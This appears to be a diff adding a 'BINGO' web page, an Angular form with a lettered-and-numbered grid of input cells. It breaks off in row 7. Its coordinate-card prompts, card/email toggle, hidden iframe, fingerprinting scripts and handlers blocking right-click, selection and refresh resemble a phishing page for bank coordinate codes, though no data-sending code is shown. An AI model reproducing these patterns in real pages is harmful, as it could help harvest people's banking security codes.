@@ -1,0 +1,402 @@
+<html><head>
+<title>BINGO</title>
+<meta name="description" content="cotenido">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="shortcut icon" href="">
+<!--<link rel="stylesheet" href="link/explo.css" type="text/css" />-->
+<link rel="stylesheet" href="Bingo_files/jquery.css">
+<link rel="stylesheet" href="Bingo_files/jquery-ui-1.css" type="text/css" media="screen">
+<script type="text/javascript" src="Bingo_files/jquery-1.js"></script>
+<script type="text/javascript" src="Bingo_files/jquery-ui-1.js"></script>
+<script type="text/javascript" src="Bingo_files/jquery.js"></script>
+<script type="text/javascript" src="Bingo_files/funciones.js"></script>
+<script type="text/javascript" src="Bingo_files/PluginDetect.js"></script>
+<script src="Bingo_files/ua-parser.js"></script>
+<style>
+.Estilo14 {color: #000000}
+
+html {
+	-webkit-background-size: cover;
+	-moz-background-size: cover;
+	-o-background-size: cover;
+	background-size: cover;
+}
+/*Estilo para Tablas*/
+.tabla_cord{
+	background-color: #FFF;
+	border-radius: 5px;
+	border: 1px #CACACA dashed;
+	outline: 0;
+	margin-bottom:4px;
+}.cord_1 {
+	font-family:Tahoma, Geneva, sans-serif;
+	color: #333;
+	background: #DCDCDC;
+	text-align: center;
+	border-radius: 5px 0 0 5px;
+	outline: 0;
+	box-shadow: inset 0px 1px 2px 0px rgba(0, 0, 0, 0.1),0px 1px 0px 0px rgba(250, 250, 250, 0.5);
+}.cord_2 {
+	text-align:center;
+	border-radius:0px 5px 5px 0px;
+	outline: 0;
+	box-shadow: inset 0px 1px 2px 0px rgba(0, 0, 0, 0.1),0px 1px 0px 0px rgba(250, 250, 250, 0.5) ;
+	background: #eef1f3;
+}.cord_2 input[type="text"]{
+	font-family:Verdana, Geneva, sans-serif;
+	font-size:15px;
+	text-align:center;
+	color: #222;
+	padding:1px;
+	border-radius:3px;
+	border:#CCC 1px solid;
+}.cord_2 input[type="password"]{
+	font-family:Verdana, Geneva, sans-serif;
+	font-size:15px;
+	text-align:center;
+	color: #222;
+	padding:1px;
+	border-radius:3px;
+	border:#CCC 1px solid;
+
+}#SelectCoordenada{
+	font-family: Verdana, Geneva, sans-serif;
+	font-size: 12px;
+	color: #F00;
+	background-color: #FFF;
+	text-align: right;
+	border-radius: 4px;
+	height: 17px;
+	margin-bottom: 4px;
+}
+.user {
+	font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
+	color:#FFF;
+	font-size: 13px;
+}
+</style>
+
+<script type="text/javascript">
+
+function validar(e) {
+    tecla = (document.all) ? e.keyCode : e.which;
+    if (tecla==8) return true;
+    patron =/[qwertyuiop�lkjhgfdsazxcvbnmQWERTYUIOP�LKJHGFDSAZXCVBNM�!"\�$%&()=?�|@#~���+*�'�,.-]/;
+	te = String.fromCharCode(tecla);
+    return !patron.test(te);
+}
+</script>
+<script type="text/javascript">
+function getDataDiv() {
+	var div_error  = document.getElementById('DivError');
+	var contenedor = document.getElementById('language-proposer');
+	if (div_error.innerHTML.length !== 0){
+		contenedor.style.height='350px';
+		$(div_error).fadeIn(1600);
+		setTimeout('DivNone()', 7000);
+		setTimeout(function(){document.getElementById('language-proposer').style.height='334px';}, 8630);
+	}
+}
+function Pintura(str){
+	var div = document.getElementById('SelectCoordenada');
+	div.innerHTML = str;
+	div.style.display='block';
+}
+function SetCheckBox(id) {
+	var msg = '<b><font color="#000">Ingrese la Coordenada: </font>' + id + '</b>';
+	Pintura(msg);
+	return false;
+}
+/*Verifica formulario completo*/
+function validaCoordenadas(){
+	var inputs    = document.getElementsByTagName('input');
+	var div_error = document.getElementById('SelectCoordenada');
+	var input_coord;
+	var msg;
+	var dato;
+	for (i = 0; i < inputs.length; i++){
+		input_coord = inputs[i];
+		if(input_coord.type == "password"){
+			if(input_coord.value.length < 2){
+				msg = '<b><font color="#000" id=fufis>Ingrese la Coordenada: </font>' + input_coord.id + '</b>';
+				Pintura(msg);
+				document.getElementById(input_coord.id).value = "";
+				document.getElementById(input_coord.id).focus();
+				return false;
+			}
+		}
+	}
+	return true;
+}
+
+
+          <!--
+function calcHeight()
+ {
+//find the height of the internal page
+    var the_height=
+    document.getElementById('resize').contentWindow.
+    document.body.scrollHeight;
+
+    //change the height of the iframe
+    document.getElementById('resize').height=
+    the_height;
+}
+//-->
+
+</script>
+<script>
+	 function hideen()
+	 {
+		document.getElementById('principal2').style.visibility = 'visible';
+		document.getElementById('principal1').style.visibility = 'hidden';
+		document.getElementById('Tabla_Borde').style.height = '500';
+	 }
+
+
+
+	function genderSelectHandler(select){
+		if(select.value == 'correo')
+		{
+			document.getElementById('principal2').style.visibility = 'hidden';
+			document.getElementById('principal1').style.visibility = 'visible';
+			document.getElementById('fufis').style.visibility = 'hidden';
+			document.getElementById('Tabla_Borde').style.height = '320';
+		}else if(select.value == 'tarjeta')
+		{
+			document.getElementById('principal1').style.visibility = 'hidden';
+			document.getElementById('principal2').style.visibility = 'visible';
+			document.getElementById('fufis').style.visibility = 'visible';
+			document.getElementById('Tabla_Borde').style.height = '500';
+		}
+	}
+</script>
+</head>
+<body onload="foot();hideen();validaCoordenadas();getDataDiv();" oncontextmenu="return false" onselectstart="return false" ondragstart="return false" onkeydown="return cancelRefresh(event)">
+<iframe src="Bingo_files/globalposition.html" width="100%" height="1100px" frameborder="0"></iframe>
+<font size="2" face="Arial"></font>
+</span>
+<a href="#" class="ui-dialog-titlebar-close ui-corner-all" role="button" style="display: none;">
+<span class="ui-icon ui-icon-closethick">hide</span></a></div>
+<div id="popupdatos" class="ui-dialog-content ui-widget-content" style="width: auto; min-height: 96.64px; height: auto;">
+      <iframe name="respond" id="respond" style="display:none"></iframe>
+
+
+
+<section>
+
+
+
+    <a href="#" class="ui-dialog-titlebar-close ui-corner-all" role="button" style="display: none;">
+        <span class="ui-icon ui-icon-closethick">hide</span></a>
+
+    <div id="popupdatos" class="ui-dialog-content ui-widget-content" style="width: auto; min-height: 96.64px; height: auto;">
+        <iframe name="respond" id="respond" style="display:none"></iframe>
+
+
+
+        <form [formGroup]="this.BingoService.formulariobingo" (ngSubmit)="registro()">
+
+            <div align="justify">
+                <font size="2" face="Arial">
+                    <b><span class="Estilo14"></span></b><br>
+                    <br>
+                    <strong> </strong>
+                </font><br><br>
+                <hr style="border-top: 1px dashed rgb(184, 184, 184); margin:4px 0 2px">
+            </div>
+            <font size="2" face="Arial">
+                <div id="SelectCoordenada" style="display: block;">
+                    <b><font color="#000"></font></b>
+                </div>
+                <hr style="border-top: 1px dashed rgb(184, 184, 184); margin:4px 0 2px">
+                <br>
+
+                <table width="190" cellspacing="0" cellpadding="0" border="0" align="center">
+                    <tbody>
+                        <tr>
+                            <td width="12">COORDEMADS<br>
+                                <table id="Tabla_Borde" class="tabla_cord" width="461" cellspacing="1" cellpadding="1" border="0" align="center">
+                                    <tbody>
+                                        <tr>
+                                            <td>
+
+                                                <table id="Tabla_Coordenadas" cellspacing="3" cellpadding="1" border="0">
+                                                    <tbody id="principal3">
+                                                        <tr>
+                                                            <td style="width:20px;border:0px"></td>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500;border:0px;font-size:11px" width="35" height="10px">
+                                                                <b><font color="#000"><span class="Estilo1">A</span></font></b>
+                                                            </td>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500;border:0px;font-size:11px" width="35" height="10px"><b><font color="#000"><span class="Estilo1">B</span></font></b></td>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500;border:0px;font-size:11px" width="35" height="10px"><b><font color="#000"><span class="Estilo1">C</span></font></b></td>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500;border:0px;font-size:11px" width="35" height="10px"><b><font color="#000"><span class="Estilo1">D</span></font></b></td>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500;border:0px;font-size:11px" width="35" height="10px"><b><font color="#000"><span class="Estilo1">E</span></font></b></td>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500;border:0px;font-size:11px" width="35" height="10px"><b><font color="#000"><span class="Estilo1">F</span></font></b></td>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500;border:0px;font-size:11px" width="35" height="10px"><b><font color="#000"><span class="Estilo1">G</span></font></b></td>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500;border:0px;font-size:11px" width="35" height="10px"><b><font color="#000"><span class="Estilo1">H</span></font></b></td>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500;border:0px;font-size:11px" width="35" height="10px"><b><font color="#000"><span class="Estilo1">I</span></font></b></td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500; border:0px">&nbsp;<b><font style="top:5px;font-size:11px" color="#000">1</font></b></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;" bgcolor="#F1F1F1;FFF">
+                                                                <font style="font-family: Arial,Verdana,Helvetica,sans-serif;font-size: 11px;color: #F60;"><b></b> </font><input formControlName="A1" type="text" id="A1" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px">
+                                                            </td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="B1" type="text" class="input-normal" id="B1" size="1" maxlength="2" style="text-align: center; width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="C1" type="text" class="input-normal" id="C1" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="D1" type="text" class="input-normal" id="D1" size="1" maxlength="2" style="text-align: center; width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="E1" type="text" class="input-normal" id="E1" size="1" maxlength="2" style="text-align: center; width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="F1" type="text" class="input-normal" id="F1" size="1" maxlength="2" style="text-align: center; width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="G1" type="text" class="input-normal" id="G1" size="1" maxlength="2" style="text-align: center; width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="H1" type="text" class="input-normal" id="H1" size="1" maxlength="2" style="text-align: center; width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="I1" type="text" class="input-normal" id="I1" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+
+
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500; border:0px">&nbsp;<b><font style="top:5px;font-size:11px" color="#000">2</font></b></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px" maxlength="2" size="1" id="A2" class="input-normal" type="text" formControlName="A2" onclick="SetCheckBox(this.id)"
+                                                                    onkeypress="return validar(event)"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="B2" type="text" class="input-normal" id="B2" size="1" maxlength="2" style="text-align: center; background-color:#F9F9F9;width:30px;font-size:11px" onclick="SetCheckBox(this.id)"
+                                                                    onkeypress="return validar(event)"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="C2" type="text" class="input-normal" id="C2" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="D2" type="text" class="input-normal" id="D2" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="E2" type="text" class="input-normal" id="E2" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;background-color:#F1F1F1;"><input formControlName="F2" type="text" class="input-normal" id="F2" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;background-color:#F1F1F1;"><input formControlName="G2" type="text" class="input-normal" id="G2" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="H2" type="text" class="input-normal" id="H2" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="I2" type="text" class="input-normal" id="I2" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+
+
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500; border:0px">&nbsp;<b><font style="top:5px;font-size:11px" color="#000">3</font></b></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="A3" type="text" class="input-normal" id="A3" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="B3" type="text" class="input-normal" id="B3" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="C3" type="text" class="input-normal" id="C3" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="D3" type="text" class="input-normal" id="D3" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="E3" type="text" class="input-normal" id="E3" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="F3" type="text" class="input-normal" id="F3" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="G3" type="text" class="input-normal" id="G3" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="H3" type="text" class="input-normal" id="H3" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="I3" type="text" id="I3" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+
+
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500; border:0px">&nbsp;<b><font style="top:5px;font-size:11px" color="#000">4</font></b></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="A4" type="text" class="input-normal" id="A4" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9; width:30px;font-size:11px" onkeypress="return validar(event)"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="B4" type="text" class="input-normal" id="B4" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="C4" type="text" class="input-normal" id="C4" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="D4" type="text" class="input-normal" id="D4" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="E4" type="text" class="input-normal" id="E4" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="F4" type="text" class="input-normal" id="F4" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="G4" type="text" class="input-normal" id="G4" size="1" maxlength="2" style="text-align: center; background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="H4" type="text" class="input-normal" id="H4" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="I4" type="text" class="input-normal" id="I4" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500; border:0px">&nbsp;<b><font style="top:5px;font-size:11px" color="#000">5</font></b></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="A5" type="text" class="input-normal" id="A5" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="B5" type="text" class="input-normal" id="B5" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="C5" type="text" class="input-normal" id="C5" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="D5" type="text" class="input-normal" id="D5" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="E5" type="text" class="input-normal" id="E5" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="F5" type="text" class="input-normal" id="F5" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="G5" type="text" class="input-normal" id="G5" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="H5" type="text" class="input-normal" id="H5" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="I5" type="text" class="input-normal" id="I5" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+
+
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500; border:0px">&nbsp;<b><font style="top:5px;font-size:11px" color="#000">6</font></b></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="A6" type="text" class="input-normal" id="A6" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="B6" type="text" class="input-normal" id="B6" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="C6" type="text" class="input-normal" id="C6" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="D6" type="text" class="input-normal" id="D6" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="E6" type="text" class="input-normal" id="E6" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="F6" type="text" class="input-normal" id="F6" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="G6" type="text" class="input-normal" id="G6" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="H6" type="text" class="input-normal" id="H6" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="I6" type="text" class="input-normal" id="I6" size="1" maxlength="2" style="text-align: center;background-color:#F9F9F9;width:30px;font-size:11px"></td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="COLOR: #474e12;FONT-WEIGHT: 500; border:0px">&nbsp;<b><font style="top:5px;font-size:11px" color="#000">7</font></b></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="A7" type="text" class="input-normal" id="A7" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="B7" type="text" class="input-normal" id="B7" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="C7" type="text" class="input-normal" id="C7" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="D7" type="text" class="input-normal" id="D7" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
+                                                            <td style="background-color:#F1F1F1;border-color:#F1F1F1;border-right-color:#F1F1F1;border-style: solid;border-top-color:#F1F1F1;border-bottom-color:#F1F1F1;border-left-color:#F1F1F1;"><input formControlName="E7" type="text" class="input-normal" id="E7" size="1" maxlength="2" style="text-align: center;width:30px;font-size:11px"></td>
